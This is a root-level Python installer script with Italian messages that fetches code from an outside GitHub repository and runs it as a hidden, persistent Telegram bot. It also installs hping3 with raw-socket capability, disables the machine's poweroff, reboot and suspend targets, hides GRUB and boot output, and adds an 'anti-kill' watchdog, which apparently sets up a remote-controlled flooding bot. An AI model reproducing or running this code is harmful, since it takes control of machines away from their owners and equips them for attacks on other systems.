#!/usr/bin/env python3
import os
import sys
import subprocess

def run(cmd, fatal=False):
    r = subprocess.run(
        cmd,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
        env=dict(os.environ, DEBIAN_FRONTEND="noninteractive")
    )
    if fatal and r.returncode != 0:
        print("ERRORE")
        sys.exit(1)

def fase(n, descr):
    print(f"FASE {n}: {descr} ... ", end="", flush=True)

def ok():
    print("OK")

# =============================
# REQUIRE ROOT
# =============================
if os.geteuid() != 0:
    print("Devi eseguire questo script come root")
    sys.exit(1)

# =============================
# 1. INSTALL DIPENDENZE BASE
# =============================
fase(1, "Installazione dipendenze base")
run("apt update -qq", fatal=True)
run(
    "apt install -y -qq hping3 git curl build-essential "
    "libssl-dev zlib1g-dev libncurses5-dev libffi-dev libreadline-dev",
    fatal=True
)
ok()

# =============================
# 2. SETCAP HPING3
# =============================
fase(2, "Configurazione capability hping3")
if os.path.exists("/usr/sbin/hping3"):
    run("setcap cap_net_raw+ep /usr/sbin/hping3")
ok()

# =============================
# 3. PATH ROOT
# =============================
fase(3, "Configurazione PATH root")
with open("/root/.bashrc", "a") as f:
    f.write("\nexport PATH=$PATH:/sbin:/usr/sbin\n")
ok()

# =============================
# 4. DISABILITA POWER / REBOOT / SUSPEND
# =============================
fase(4, "Disabilitazione power / reboot / suspend")
targets = [
    "ctrl-alt-del.target",
    "poweroff.target",
    "reboot.target",
    "suspend.target",
    "hibernate.target"
]
for t in targets:
    run(f"systemctl mask {t}")
ok()

# =============================
# 5. GRUB – NASCOSTO SICURO
# =============================
fase(5, "Configurazione GRUB invisibile")
with open("/etc/default/grub", "w") as f:
    f.write("""GRUB_TIMEOUT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_HIDDEN_TIMEOUT=0
GRUB_DISABLE_RECOVERY=true
GRUB_DISABLE_SUBMENU=true
GRUB_FORCE_HIDDEN_MENU=true
GRUB_RECORDFAIL_TIMEOUT=0
GRUB_CMDLINE_LINUX_DEFAULT="quiet loglevel=0 systemd.show_status=false vt.global_cursor_default=0"
""")
run("update-grub")
ok()

# =============================
# 6. INSTALL PYTHON 3.10
# =============================
fase(6, "Compilazione e installazione Python 3.10")
run("cd /usr/src && curl -s -O https://www.python.org/ftp/python/3.10.14/Python-3.10.14.tgz", fatal=True)
run("cd /usr/src && tar xzf Python-3.10.14.tgz", fatal=True)
run("cd /usr/src/Python-3.10.14 && ./configure --enable-optimizations", fatal=True)
run("cd /usr/src/Python-3.10.14 && make -j$(nproc)", fatal=True)
run("cd /usr/src/Python-3.10.14 && make altinstall", fatal=True)
ok()

# =============================
# 7. BOT + LIBRERIE
# =============================
fase(7, "Installazione bot e librerie")
run("/usr/local/bin/python3.10 -m ensurepip", fatal=True)
run("/usr/local/bin/python3.10 -m pip install --quiet --upgrade pip", fatal=True)
run("/usr/local/bin/python3.10 -m pip install --quiet python-telegram-bot==13.15", fatal=True)
run("cd /root && git clone -q https://github.com/troiarcazzoguardi-dev/bott.git")

if os.path.exists("/root/bott"):
    run("mv /root/bott /root/.bott")
    run("chmod 711 /root/.bott")
ok()

# =============================
# 8. SERVICE BOT
# =============================
fase(8, "Creazione servizio systemd bot")
with open("/etc/systemd/system/bott.service", "w") as f:
    f.write("""[Unit]
Description=Telegram Bot
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/.bott
ExecStart=/usr/local/bin/python3.10 /root/.bott/bott.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
""")

run("systemctl daemon-reload")
run("systemctl enable bott")
run("systemctl start bott")
ok()

# =============================
# 9. WATCHDOG ANTI-KILL
# =============================
fase(9, "Attivazione watchdog anti-kill")
with open("/etc/systemd/system/bott-watchdog.service", "w") as f:
    f.write("""[Unit]
Description=Bot Watchdog
After=bott.service

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do systemctl is-active --quiet bott || systemctl restart bott; sleep 10; done'
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
""")

run("systemctl daemon-reload")
run("systemctl enable bott-watchdog")
run("systemctl start bott-watchdog")
ok()

print("\nCOMPLETATO")
